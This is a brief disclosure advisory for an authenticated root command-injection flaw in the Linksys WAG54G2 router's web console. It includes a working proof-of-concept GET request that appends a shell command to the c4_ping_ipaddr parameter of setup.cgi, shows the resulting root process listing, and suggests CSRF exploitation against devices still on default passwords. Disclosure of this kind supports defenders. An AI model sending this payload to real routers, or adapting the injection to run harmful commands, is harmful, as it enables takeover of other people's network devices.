<html><head><title>Linksys WAG54G2 Web Management Console Arbitrary Command Exec</title></head><pre>1. Linksys WAG54G2 router is a popular SOHO class device. It provides ADSL / WiFi / Ethernet interfaces.

2. When logged into web management console, it is possible to execute commands as root (tested on firmware: V1.00.10).

3. PoC:

GET /setup.cgi?ping_ipaddr1=1&amp;ping_ipaddr2=1&amp;ping_ipaddr3=1&amp;ping_ipaddr4=1&amp;ping_size=60&amp;ping_number=1&amp;ping_interval=1000&amp;ping_timeout=5000&amp;start=Start+Test&amp;todo=ping_test&amp;this_file=Diagnostics.htm&amp;next_file=Diagnostics.htm&amp;c4_ping_ipaddr=1.1.1.1;/bin/ps aux&amp;message= HTTP/1.1

    4 root            SW&lt; [khelper]
    5 root            SW&lt; [kthread]
...

4. Note that it is needed to supply valid user/password (Authorization HTTP header).

5. One could try to exploit this issue remotely (using CRSF) assuming that a victim did not change default password to the web management.

6. The vendor (Cisco) was contacted in march '09 and confirmed the issue (but still it remains unpatched).
